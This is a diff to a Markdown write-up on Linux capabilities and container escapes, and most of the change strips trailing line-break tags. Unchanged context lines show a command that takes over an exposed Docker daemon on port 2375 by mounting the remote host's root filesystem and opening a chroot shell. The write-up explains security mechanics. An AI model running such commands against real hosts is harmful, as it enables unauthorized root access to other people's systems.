@@ -11,21 +11,21 @@ pagination:
 # [](#header-1)Capabilities
 
 It's actually an additional way to secure (in addition to default RWX) processes. We have main tools in userspace to interact with them:
-setcap</br>
-getcap</br>
-capsh --print</br>
-getpcaps $$</br>
-(and others from [libcap2](https://packages.debian.org/sid/libcap2) package)</br>
+setcap
+getcap
+capsh --print
+getpcaps $$
+(and others from [libcap2](https://packages.debian.org/sid/libcap2) package)
 From the official debian description:
 >Libcap implements the user-space interfaces to the POSIX 1003.1e capabilities available in Linux kernels. These capabilities are a partitioning of the all powerful root privilege into a set of distinct privileges.
 
-From [linux man page](https://man7.org/linux/man-pages/man7/capabilities.7.html) we have all available capabilities, lit's dive into the source code of one of them</br>
+From [linux man page](https://man7.org/linux/man-pages/man7/capabilities.7.html) we have all available capabilities, lit's dive into the source code of one of them
 One of them, which everyone knows - 
 ```
 CAP_NET_BIND_SERVICE
   Bind a socket to Internet domain privileged ports (port numbers less than 1024).
 ```
-For a lower level of abstaction we'll use our programs</br>
+For a lower level of abstaction we'll use our programs
 
 In default state typical user without additional permissions can't run services on ports less than 1024:
 
@@ -80,7 +80,7 @@ test@local:~$ ./program
 Done!
 ```
 
-Default one for ex</br>
+Default one for ex
 ```bash
 root@local:~$ getcap /bin/ping
 /bin/ping cap_net_raw=ep
@@ -88,7 +88,7 @@ root@local:~$ getcap /bin/ping
 
 In the source code of libcap2(userspace api) we can find the following:
 
-3 variants of capabilities:</br>
+3 variants of capabilities:
 ```go
 # /cap/cap.go
 func (f Flag) String() string {
@@ -105,11 +105,11 @@ func (f Flag) String() string {
 }
 ```
 
-**Effective** - currently activated for process</br>
-**Permitted** - may be potentially activated and moved to Effective</br>
+**Effective** - currently activated for process
+**Permitted** - may be potentially activated and moved to Effective
 **Inheritable** - rights, which may be inherited by a child process, if it explicitly requests it
 
-The full list can be found for ex in</br>
+The full list can be found for ex in
 ```go
 /cap/names.go
 var names = map[Value]string{
@@ -123,7 +123,7 @@ var names = map[Value]string{
 ...
 ```
 
-In kernel we can find such thing:</br>
+In kernel we can find such thing:
 ```c
 /kernel/capability.c
 /**
@@ -410,7 +410,7 @@ Even if we are already in the container, socket is host based, so if we the moun
 
 ### [](#header-3) If docker daemon is exposed(portainer/jenkins for remote administration):
 
-port 2375</br>
+port 2375
 ```bash
 docker -H tcp://REMOTEIP:2375 ps
 docker -H tcp://REMOTEIP:2375 run -it --rm -v /:/host alpine chroot /host sh
@@ -425,11 +425,11 @@ We switch namespaces to PID 1 process
 
 
 ## [](#header-2)Links / Resources
-[Linux Capabilities: making them work](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/33528.pdf)</br>
-[Bug case in sendmail](https://seclists.org/bugtraq/2000/Jun/98)</br>
-[capabilities walkthough](https://blog.senyuuri.info/posts/2021-02-06-linux-capability-a-kernel-workthrough/)</br>
+[Linux Capabilities: making them work](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/33528.pdf)
+[Bug case in sendmail](https://seclists.org/bugtraq/2000/Jun/98)
+[capabilities walkthough](https://blog.senyuuri.info/posts/2021-02-06-linux-capability-a-kernel-workthrough/)
 
 
 
 # [](#header-1)All Links / Resources
-[Papers extracted from the proceedings of the Ottawa Linux Symposium](https://www.kernel.org/doc/ols/)</br>
+[Papers extracted from the proceedings of the Ottawa Linux Symposium](https://www.kernel.org/doc/ols/)
